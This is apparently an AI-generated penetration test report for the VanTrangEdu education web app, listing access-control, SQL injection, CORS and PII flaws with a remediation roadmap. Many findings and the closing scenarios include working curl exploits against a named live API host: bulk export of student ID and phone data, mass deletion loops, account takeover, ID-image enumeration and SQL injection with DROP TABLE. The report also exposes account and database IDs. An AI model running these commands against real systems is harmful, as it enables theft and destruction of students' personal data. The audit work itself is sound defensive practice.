# VanTrangEdu — Penetration Test Report (Red Team Assessment)

**Date:** 2026-03-04
**Target:** VanTrangEdu Web Application (Frontend + Backend)
**Stack:** Hono.js on Cloudflare Workers, D1 (SQLite), R2, React SPA
**Auditor:** Claude Opus 4.6 (Automated Static Analysis)
**Methodology:** OWASP Top 10 2025 + OWASP API Security Top 10 + PII/GDPR Review

---

## EXECUTIVE SUMMARY

| Severity | Count |
|----------|-------|
| **CRITICAL** | 7 |
| **HIGH** | 9 |
| **MEDIUM** | 11 |
| **LOW** | 6 |
| **INFO** | 5 |

The application contains **multiple critical broken access control vulnerabilities** allowing unauthenticated data exfiltration of PII (CCCD, phone numbers, addresses, student records). Several routes handling sensitive operations have **no authentication middleware**. The student authentication model (CCCD + phone number) is **fundamentally weak**. SQL injection via dynamic column names in the backup utility poses a critical risk.

---

## A01 — BROKEN ACCESS CONTROL [CRITICAL]

### VULN-01: Export Routes — Fully Unauthenticated [CRITICAL]

**File:** `backend/src/index.js:116`
```js
app.route('/export', exportRoute);
// Comment says "admin only trong production" — BUT NO MIDDLEWARE APPLIED
```

**File:** `backend/src/routes/export.js` — All 5 endpoints (`/class/:id`, `/class/:id/json`, `/class/:id/csv`, `/exam/:exam_id`, `/exam/:exam_id/exam-list`) are **PUBLIC**.

**Impact:** Any unauthenticated user can export the **full PII of every student** (full name, CCCD number, date of birth, phone, email, address, workplace) in any class or exam by hitting:
```
GET /export/class/1
GET /export/class/1/json
GET /export/exam/1
```

**PoC:**
```bash
curl https://vantrangedu-api.bangachieu2.workers.dev/export/class/1/json
# Returns full student records with CCCD, phone, email, address
```

**Risk:** Mass PII data breach. Violation of Vietnam PDPA.

---

### VULN-02: Registrations Routes — No Auth on Sensitive Operations [CRITICAL]

**File:** `backend/src/index.js:101`
```js
app.route('/registrations', registrations);
// No authMiddleware applied at route level
```

**File:** `backend/src/routes/registrations.js` — The following endpoints have **zero authentication**:
- `PUT /registrations/:id/status` — Anyone can change registration status (approve/cancel)
- `PUT /registrations/:id/so-phach` — Anyone can modify exam phách numbers
- `DELETE /registrations/:id` — Anyone can delete registrations
- `GET /registrations/class/:class_id` — Anyone can list all students in any class
- `POST /registrations/` — Registration creation (intentionally public, but see VULN-04)

**PoC:**
```bash
# Delete any registration
curl -X DELETE https://vantrangedu-api.bangachieu2.workers.dev/registrations/1

# Approve/modify any registration status
curl -X PUT https://vantrangedu-api.bangachieu2.workers.dev/registrations/1/status \
  -H "Content-Type: application/json" \
  -d '{"status":"approved"}'
```

---

### VULN-03: Classes Routes — No Auth on Write Operations [CRITICAL]

**File:** `backend/src/index.js:100`
```js
app.route('/classes', classes);
// No authMiddleware at route level
```

**File:** `backend/src/routes/classes.js` — All endpoints including:
- `POST /classes` — Create classes (no auth)
- `PUT /classes/:id` — Modify classes (no auth)
- `DELETE /classes/:id` — Delete classes (no auth)
- `POST /classes/:id/students` — Add students to classes (no auth)

**PoC:**
```bash
curl -X DELETE https://vantrangedu-api.bangachieu2.workers.dev/classes/1
```

---

### VULN-04: Certificates — Bulk Issue Without Auth [HIGH]

**File:** `backend/src/routes/certificates.js` — Mounted at `backend/src/index.js:113` without auth.

- `POST /certificates/bulk` — Issues certificates for any students. Uses `c.get('user')` but does **not enforce** auth. If `user` is null, `issued_by` is just `null`.
- `PUT /certificates/:id/revoke` — Revoke any certificate without auth
- `GET /certificates/` — List all certificates without auth
- `GET /certificates/class/:id/eligible` — List eligible students without auth

---

### VULN-05: Notifications — Create/Delete Without Auth [HIGH]

**File:** `backend/src/routes/notifications.js` — Mounted without auth at `index.js:137`.

- `POST /notifications/` — Anyone can create notifications visible to all users
- `DELETE /notifications/:id` — Anyone can delete any notification
- `PUT /notifications/:id/read` — Anyone can mark notifications as read

---

### VULN-06: Student Image Upload — No Auth Required [HIGH]

**File:** `backend/src/routes/students.js:11`
```js
students.post('/upload-image', async (c) => {
  // NO AUTH CHECK - anyone can upload files to R2
```

**Impact:** Unauthenticated file upload to R2 storage. Can be used for:
- Storage abuse (upload unlimited files)
- Hosting malicious content on your domain
- Possible path traversal via filename manipulation

---

### VULN-07: Student Image Serving — Wildcard CORS [HIGH]

**File:** `backend/src/routes/students.js:23-31`
```js
students.get('/image/:key', async (c) => {
  const object = await c.env.R2.get(c.req.param('key'));
  // ...
  headers.set('Access-Control-Allow-Origin', '*'); // WILDCARD!
```

**Impact:** Any key can be requested without auth. If CCCD images are stored in R2 with predictable keys (pattern: `student-images/{timestamp}-{filename}`), an attacker can enumerate and download PII images.

---

### VULN-08: CCCD Upload Status — No Auth [MEDIUM]

**File:** `backend/src/routes/cccd-upload.js:214`
```js
app.get('/status/:logId', async (c) => {
  // No auth middleware — anyone can check processing status
```

**Impact:** Information disclosure about image processing status and AI confidence scores.

---

### VULN-09: GET /students/:cccd — Horizontal Privilege Escalation (Weak) [MEDIUM]

**File:** `backend/src/routes/students.js:95-100`
```js
students.get('/:cccd', requireAuth, createGetEndpoint({
  handler: async (c, { params }) => {
    return await StudentService.getStudentByCCCD(c, params.cccd);
  }
}));
```

The `getStudentByCCCD` function in `student-service.ts:135` does **not check** if the requesting student's CCCD matches the requested CCCD. Any authenticated user (student, teacher, admin) can query any other student's full profile including PII.

**Mitigation exists partially:** The `requireAuth` middleware ensures authentication, but the service does not enforce ownership checks for student-type tokens.

---

### VULN-10: Documents — Public Download Without Auth [MEDIUM]

**File:** `backend/src/routes/documents.js:89-101`
```js
documents.get('/:id/download', async (c) => {
  // No authMiddleware — public download
```
Also: `/:id/view`, `/cccd/:cccd`, `/student`, `/` — all public.

**Impact:** Anyone can download documents, view document lists, and query documents by CCCD.

---

## A02 — CRYPTOGRAPHIC FAILURES [HIGH]

### VULN-11: Student Auth Model — CCCD + Phone = Knowledge-Based Only [CRITICAL]

**File:** `backend/src/services/student-service.ts:47-66`
```ts
export async function loginStudent(c, cccd, sdt) {
  const student = await StudentRepo.findStudentByCCCD(c.env.DB, cccd.trim());
  if (normalizePhone(student.sdt) !== normalizePhone(sdt)) throw ...
  const token = await generateJWT({ ... exp: 7 * 24 * 60 * 60 }, ...);
```

**Problems:**
1. **No password** — Auth is CCCD + phone number. Both are **public knowledge** (CCCD is on every official document; phone numbers are easily obtained).
2. **7-day JWT expiry** — Very long session for knowledge-based auth.
3. **No MFA/OTP** — No second factor.
4. **No account lockout on student login** — Rate limiting exists per IP but can be bypassed with rotating IPs.

**PoC:** If attacker knows a student's CCCD (12-digit number on ID card) and phone number, they gain full access to that student's account, data, exam history, registrations, and can modify personal information.

---

### VULN-12: JWT Custom Implementation — No Standard Library [HIGH]

**File:** `backend/src/utils/helpers.js:60-123`

Custom JWT implementation using `crypto.subtle.sign('HMAC', ...)`. While technically correct:
1. **No `kid` (key ID) header** — Cannot support key rotation.
2. **No `iss`/`aud` claims** — No issuer/audience validation. A token from admin login can be used on student endpoints.
3. **Non-standard base64 encoding** — Uses `btoa(unescape(encodeURIComponent(...)))` which may have edge cases.
4. **Backward compatibility hack for exp** (line 112-113): `payload.exp > 4102444800` detects ms vs seconds — fragile.
5. **Single shared JWT_SECRET** — Admin, teacher, student tokens all signed with the same secret. Cross-role token reuse possible if `role` claim isn't consistently checked.

---

### VULN-13: Teacher Exp Check Bug — Milliseconds vs Seconds [MEDIUM]

**File:** `backend/src/routes/teachers.js:32`
```js
if (!payload || (payload.exp && payload.exp < Date.now())) {
  return errorResponse('Token không hợp lệ hoặc đã hết hạn', 401);
}
```

`payload.exp` is in **seconds** (Unix epoch), but `Date.now()` returns **milliseconds**. Since `exp` (seconds) will always be less than `Date.now()` (milliseconds), this check **always fails** for expired tokens AND valid tokens.

**Wait** — actually `exp` in seconds (~1.7 billion) IS less than `Date.now()` in ms (~1.7 trillion), so this would incorrectly reject ALL tokens... unless there's a legacy ms-format token. The `verifyJWT` function in `helpers.js` handles this correctly, but the teachers middleware re-checks incorrectly, creating inconsistent behavior.

**Actual Impact:** The `verifyJWT` function (called first at line 30) already handles expiry correctly. The redundant check at line 32 would incorrectly flag tokens. Since `verifyJWT` returns `null` for truly expired tokens, the redundant check on non-null payloads creates a **logic bug** where ALL teacher tokens are potentially rejected if their `exp` is in seconds format. The same bug exists in `adminAuthMiddleware` at line 281.

---

### VULN-14: Sensitive Data in localStorage [HIGH]

**File:** `frontend/src/pages/public/UnifiedLogin.jsx:61-63`
```js
localStorage.setItem('student_cccd', data.cccd);
localStorage.setItem('student_sdt', data.sdt);
localStorage.setItem('student_data', JSON.stringify(response.data));
```

Also: `teacher_token`, `admin_token`, `student_token` all in localStorage.

**Impact:**
- Any XSS vulnerability gives attacker access to ALL auth tokens and PII
- Browser extensions can read localStorage
- `student_data` contains full student record including CCCD, phone, address
- No `httpOnly` cookie option (cannot use cookies in Workers easily, but should note the risk)

---

### VULN-15: Password Reset Token in Dev Response [MEDIUM]

**File:** `backend/src/routes/auth.js:229`
```js
if (c.env.ENVIRONMENT === 'development') {
  return jsonResponse({
    resetToken: resetToken, // Only in development
  });
}
```

If `ENVIRONMENT` env var is misconfigured or missing in production, reset tokens could leak.

---

### VULN-16: CORS Wildcard in jsonResponse Helper [HIGH]

**File:** `backend/src/utils/helpers.js:178-184`
```js
export function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    headers: {
      'Access-Control-Allow-Origin': '*', // BYPASSES HONO CORS MIDDLEWARE!
```

**Impact:** The Hono CORS middleware at `index.js:59` correctly restricts origins, **but** every response created via `jsonResponse()` or `errorResponse()` has `Access-Control-Allow-Origin: *`, **completely bypassing** the CORS whitelist.

This means **any website** can make authenticated cross-origin requests to the API if the user has a token. Combined with localStorage token storage, this enables:
1. Attacker hosts malicious page
2. User visits it while logged into VanTrangEdu
3. Malicious page reads API responses via CORS wildcard

---

## A03 — INJECTION [HIGH]

### VULN-17: SQL Injection via Dynamic Table/Column Names [CRITICAL]

**File:** `backend/src/utils/backup.js:32`
```js
const result = await db.prepare(`SELECT * FROM ${table}`).all();
```

**File:** `backend/src/utils/backup.js:52`
```js
const result = await db.prepare(`SELECT * FROM ${tableName}`).all();
```

The `tableName` parameter in `exportTableToCSV` comes from user input via:
```
GET /backup/export/csv/:table
```

**File:** `backend/src/routes/backup.js:50`
```js
const { table } = c.req.param();
const csvData = await exportTableToCSV(c.env.DB, table);
```

While D1/SQLite parameterized queries protect values, **table names cannot be parameterized**. The `table` parameter is taken directly from URL path.

**PoC:**
```bash
curl -H "Authorization: Bearer <super_admin_token>" \
  "https://api/backup/export/csv/students%20WHERE%201=1%20UNION%20SELECT%20*%20FROM%20admins--"
```

**Mitigation:** Requires super_admin auth, but still a SQL injection vector.

---

### VULN-18: SQL Injection via Dynamic Column Names in updateStudent [HIGH]

**File:** `backend/src/repositories/student-repository.ts:50-63`
```ts
export async function updateStudent(db, id, data) {
  const fields = Object.keys(data);
  const updates = fields.map(f => `${f} = ?`).join(', ');
  // field NAMES are from user-controlled data object
```

If an attacker can control the keys in the update body (via `PUT /students/update-by-cccd`), they can inject SQL in column names. The `z.any()` schema validation at `students.js:105` does **not** restrict field names.

**PoC:**
```bash
curl -X PUT /students/update-by-cccd \
  -H "Authorization: Bearer <student_token>" \
  -d '{"cccd":"001234567890", "ho=1 WHERE 1=1; DROP TABLE students; --":"test"}'
```

D1's prepared statement `.bind()` won't protect against column name injection.

---

### VULN-19: Stored XSS via Notification Messages [MEDIUM]

**File:** `backend/src/routes/notifications.js:96-123`
```js
notifications.post('/', async (c) => {
  const { title, message, type, link } = await c.req.json();
  // No sanitization, no auth
  await createNotification(c.env.DB, { title, message, ... });
```

Notification `title` and `message` are stored without sanitization. If rendered as HTML in frontend, this enables stored XSS.

---

### VULN-20: Path Traversal in R2 Key [MEDIUM]

**File:** `backend/src/routes/students.js:24`
```js
const object = await c.env.R2.get(c.req.param('key'));
```

**File:** `backend/src/routes/cccd-upload.js:266`
```js
const key = decodeURIComponent(c.req.param('key'));
const object = await c.env.R2.get(key);
```

No validation that the key is within expected prefixes. An attacker could potentially access any R2 object:
```bash
GET /students/image/backups/database-2026-03-01.json
# Could expose full database backup!
```

---

## A04 — INSECURE DESIGN [HIGH]

### VULN-21: No CAPTCHA on Any Endpoint [MEDIUM]

No CAPTCHA on:
- Student registration (`POST /students/register`)
- Student login (`POST /students/login`)
- Admin forgot-password (`POST /auth/forgot-password`)
- Class registration (`POST /registrations`)

**Impact:** Automated account creation, credential stuffing, registration spam.

---

### VULN-22: No Account Lockout [MEDIUM]

Rate limiting exists (5 attempts per 15 min per IP), but:
- **In-memory store** on Cloudflare Workers means each Worker isolate has its own store
- Workers can run on multiple edge locations — rate limit state is **not shared**
- IP rotation (VPN/proxies) bypasses IP-based limiting
- No account-level lockout (locking the account after N failures regardless of IP)

---

### VULN-23: Teacher Password Policy Too Weak [LOW]

**File:** `backend/src/routes/teachers.js:183`
```js
if (new_password.length < 6) {
  return errorResponse('Mật khẩu mới phải có ít nhất 6 ký tự', 400);
}
```

Admin password requires 8 chars, teacher only 6. No complexity requirements for either.

---

### VULN-24: No JWT Revocation / Logout Invalidation [MEDIUM]

**File:** `backend/src/routes/auth.js:274-276`
```js
// Note: In production, you'd use Redis/KV to invalidate sessions
// For now, we'll rely on JWT expiration
```

After password reset, old JWT tokens remain valid until expiry (24h for admin, 7 days for student). No token blacklist or session invalidation mechanism.

---

### VULN-25: create-admin Endpoint — Race Condition [MEDIUM]

**File:** `backend/src/routes/auth.js:125-170`
```js
auth.post('/create-admin', async (c) => {
  const adminCount = await getAdminCount(c.env.DB);
  if (adminCount > 0) return errorResponse(...);
  // ... creates admin
```

Time-of-check-time-of-use (TOCTOU) race condition. If two requests hit this endpoint simultaneously before any admin exists, both could pass the `adminCount > 0` check and create two admins.

---

## A05 — SECURITY MISCONFIGURATION [MEDIUM]

### VULN-26: Cloudflare Account ID Exposed in wrangler.toml [LOW]

**File:** `backend/wrangler.toml:31`
```toml
CLOUDFLARE_ACCOUNT_ID = "5b62d10947844251d23e0eac532531dd"
```

While not a secret per se, the account ID enables targeted API calls against the Cloudflare account.

---

### VULN-27: Database ID Exposed in wrangler.toml [LOW]

**File:** `backend/wrangler.toml:10`
```toml
database_id = "ae59b4c6-0c72-4e7c-856c-d2106da89004"
```

---

### VULN-28: Error Messages Leak Implementation Details [MEDIUM]

**File:** `backend/src/index.js:218`
```js
app.onError((err, c) => {
  return errorResponse('Lỗi server: ' + err.message, 500);
});
```

Error stack traces and internal error messages are returned to clients in production. Also at various routes: `error.message` is directly returned.

---

### VULN-29: In-Memory Rate Limiter — Ineffective on Workers [MEDIUM]

**File:** `backend/src/utils/rate-limiter.js`

The rate limiter uses a `Map()` as in-memory store. On Cloudflare Workers:
- Each Worker isolate has its own memory space
- Requests may be routed to different isolates
- Rate limit state is **not shared** across isolates
- Memory is wiped when isolate is evicted

**Impact:** Rate limiting is unreliable. Should use Cloudflare KV, Durable Objects, or the built-in `rate_limit` binding.

---

## A06 — VULNERABLE/OUTDATED COMPONENTS [LOW]

### VULN-30: bcryptjs in Workers Environment [INFO]

**File:** `backend/src/utils/helpers.js:1`
```js
import bcrypt from 'bcryptjs';
```

`bcryptjs` is a pure-JS implementation. While functional, it may be slower than native implementations. Consider using Web Crypto API with PBKDF2 for better Workers compatibility.

---

## A07 — IDENTIFICATION AND AUTHENTICATION FAILURES [HIGH]

### VULN-31: Single JWT Secret for All Roles [HIGH]

Admin, teacher, and student tokens all share the same `JWT_SECRET`. While role claims exist, there's no audience separation. A student token could potentially be used on admin endpoints if the middleware only checks for token validity without role checking.

**Example:** `GET /notifications` — middleware reads `c.get('user')` which is only set by some middleware. If a route doesn't apply authMiddleware but reads `user`, a student token may grant unintended access.

---

### VULN-32: Student Token Contains PII [LOW]

**File:** `backend/src/services/student-service.ts:58`
```ts
const token = await generateJWT({
  id: student.id, cccd: student.cccd, ho_ten: student.ho_ten_full, type: 'student',
```

JWT payload contains CCCD (national ID) and full name. JWTs are base64-encoded (not encrypted). Anyone who intercepts the token can read PII.

---

## A08 — SOFTWARE AND DATA INTEGRITY FAILURES [MEDIUM]

### VULN-33: Restore Backup — SQL Injection [HIGH]

**File:** `backend/src/utils/backup.js:164-181`
```js
for (const [tableName, rows] of Object.entries(backup.tables)) {
  const columns = Object.keys(rows[0]);
  const values = columns.join(', ');
  await db.prepare(
    `INSERT OR REPLACE INTO ${tableName} (${values}) VALUES (${placeholders})`
  ).bind(...rowValues).run();
```

If a malicious backup file is uploaded to R2, both `tableName` and column names are taken from the backup JSON without validation — full SQL injection.

---

## A09 — SECURITY LOGGING AND MONITORING FAILURES [MEDIUM]

### VULN-34: Insufficient Security Logging [MEDIUM]

- Failed login attempts are not logged to database (only rate-limited)
- Student login failures not logged at all
- No alerting mechanism for brute force attempts
- Security events in exam-taking only logged to `console.log`
- No audit trail for registration status changes, certificate issuance by unauthorized users

---

## A10 — SERVER-SIDE REQUEST FORGERY (SSRF) [LOW]

### VULN-35: Email Worker URL — Potential SSRF [LOW]

**File:** `backend/src/utils/email-service.js:19`
```js
if (env.EMAIL_WORKER_URL) {
  const response = await fetch(env.EMAIL_WORKER_URL, { ... });
```

If `EMAIL_WORKER_URL` is compromised or misconfigured, could be used for SSRF. Low risk since it's an env variable.

---

## PII PROTECTION (VIETNAM PDPA / GDPR) [CRITICAL]

### PII-01: Mass PII Exposure via Unauthenticated Endpoints [CRITICAL]

The following endpoints expose PII **without any authentication**:
| Endpoint | PII Exposed |
|----------|-------------|
| `GET /export/class/:id/json` | Full name, CCCD, DOB, phone, email, address, workplace |
| `GET /export/class/:id` (Excel) | Same as above |
| `GET /export/exam/:id` | Same as above |
| `GET /registrations/class/:id` | Student registration data |
| `GET /certificates/` | Student names, CCCD, certificate data |
| `GET /documents/cccd/:cccd` | Documents linked to national ID |
| `GET /students/image/:key` | CCCD images (front/back) |
| `GET /classes/` | Class information |

---

### PII-02: No Data Retention Policy [HIGH]

- No automated deletion of old student data
- CCCD images stored indefinitely in R2/Cloudflare Images
- No TTL on stored PII
- Database backups contain full PII with no encryption at rest (JSON in R2)

---

### PII-03: No Right to Deletion [HIGH]

- `DELETE /students/:id` (admin only) performs hard delete but only if no registrations exist
- No mechanism for students to request their own data deletion
- No way to purge CCCD images from R2/Cloudflare Images
- Backup files retain deleted student data

---

### PII-04: No Consent Management [MEDIUM]

- No consent collection during registration
- No privacy policy acceptance
- No opt-out mechanism for data processing
- CCCD/biometric data collected without explicit consent record

---

### PII-05: CCCD Images — Inadequate Protection [HIGH]

- CCCD front/back images contain biometric data (photo, fingerprint on some)
- R2 fallback stores images with predictable keys: `cccd-uploads/{type}/{timestamp}-{filename}`
- `GET /students/image/:key` serves ANY R2 object without auth
- No encryption at rest beyond R2's default
- No watermarking to deter misuse

---

## PROOF-OF-CONCEPT EXPLOIT SCENARIOS

### Scenario 1: Mass Data Breach (5 minutes, no auth required)

```bash
# Step 1: Enumerate all classes
curl https://vantrangedu-api.bangachieu2.workers.dev/classes | jq '.data[].id'

# Step 2: For each class, export all student PII
for id in $(seq 1 100); do
  curl -s "https://vantrangedu-api.bangachieu2.workers.dev/export/class/$id/json" \
    >> stolen_data.json
done

# Result: Full name, CCCD, DOB, phone, email, address for ALL students
```

### Scenario 2: Account Takeover — Student Impersonation

```bash
# Step 1: Get target student's CCCD + phone from export (Scenario 1)
# Step 2: Login as that student
curl -X POST https://vantrangedu-api.bangachieu2.workers.dev/students/login \
  -H "Content-Type: application/json" \
  -d '{"cccd":"001234567890","sdt":"0901234567"}'

# Step 3: Modify their personal information
curl -X PUT https://vantrangedu-api.bangachieu2.workers.dev/students/update-by-cccd \
  -H "Authorization: Bearer <stolen_token>" \
  -d '{"cccd":"001234567890","email":"attacker@evil.com","sdt":"0999999999"}'
```

### Scenario 3: Sabotage — Delete All Registrations

```bash
# No auth needed
for id in $(seq 1 10000); do
  curl -X DELETE "https://vantrangedu-api.bangachieu2.workers.dev/registrations/$id"
done
```

### Scenario 4: CCCD Image Theft via R2 Key Enumeration

```bash
# Pattern: student-images/{timestamp}-{filename}
# Enumerate timestamps around known upload times
for ts in $(seq 1709000000000 1709999999999 1000); do
  curl -sf "https://api/students/image/student-images/$ts-cccd_front.jpg" -o "cccd_$ts.jpg"
done
```

### Scenario 5: SQL Injection via Backup Export (requires super_admin)

```bash
curl -H "Authorization: Bearer <admin_token>" \
  "https://api/backup/export/csv/admins%20UNION%20SELECT%20password_hash%20FROM%20admins--"
```

---

## PRIORITY REMEDIATION ROADMAP

### Phase 1 — IMMEDIATE (0-48 hours) — Stop the Bleeding

| # | Fix | Files |
|---|-----|-------|
| 1 | **Add `authMiddleware` to `/export/*`** | `index.js:116` |
| 2 | **Add `authMiddleware` to `/registrations/*` write ops** | `index.js:101`, `registrations.js` |
| 3 | **Add `authMiddleware` to `/classes/*` write ops** | `index.js:100`, `classes.js` |
| 4 | **Add `authMiddleware` to `/certificates/*` write ops** | `index.js:113` |
| 5 | **Add `authMiddleware` to `/notifications/*` write ops** | `index.js:137` |
| 6 | **Add auth to `POST /students/upload-image`** | `students.js:11` |
| 7 | **Remove `Access-Control-Allow-Origin: *` from `jsonResponse()`** | `helpers.js:182` |

### Phase 2 — SHORT TERM (1-2 weeks)

| # | Fix |
|---|-----|
| 8 | Whitelist allowed field names in `updateStudent()` to prevent column injection |
| 9 | Whitelist table names in `exportTableToCSV()` to prevent SQL injection |
| 10 | Add R2 key prefix validation in image serving endpoints |
| 11 | Migrate rate limiter to Cloudflare Durable Objects or KV |
| 12 | Add ownership check in `getStudentByCCCD` for student tokens |
| 13 | Sanitize notification messages for XSS |
| 14 | Remove error message details from production responses |
| 15 | Fix teacher `exp` comparison bug (seconds vs milliseconds) |

### Phase 3 — MEDIUM TERM (1-2 months)

| # | Fix |
|---|-----|
| 16 | Implement OTP-based student authentication (SMS/email OTP) |
| 17 | Implement JWT revocation via KV blacklist |
| 18 | Add separate JWT secrets or audiences per role |
| 19 | Implement CAPTCHA for public endpoints |
| 20 | Add data retention policy with automated PII cleanup |
| 21 | Implement right-to-deletion workflow |
| 22 | Add consent management for CCCD data collection |
| 23 | Encrypt backups before storing in R2 |
| 24 | Implement comprehensive security logging to D1/KV |
| 25 | Add PBKDF2/Argon2 via Workers Crypto API |

---

## UNRESOLVED QUESTIONS

1. Is `ENVIRONMENT` env var correctly set to `"production"` on the live worker? (affects resetToken leak in forgot-password)
2. Are there other routes in `online-classes.js`, `assignments.js`, `videos.js` with similar missing auth? (Not fully audited)
3. Is the Cloudflare Account ID `5b62d10947844251d23e0eac532531dd` the production account? (exposed in `wrangler.toml`)
4. What is the current JWT_SECRET strength? (cannot inspect Wrangler secrets)
5. Is the `.env` file in `frontend/` committed to git? (could expose VITE_API_URL in CI)
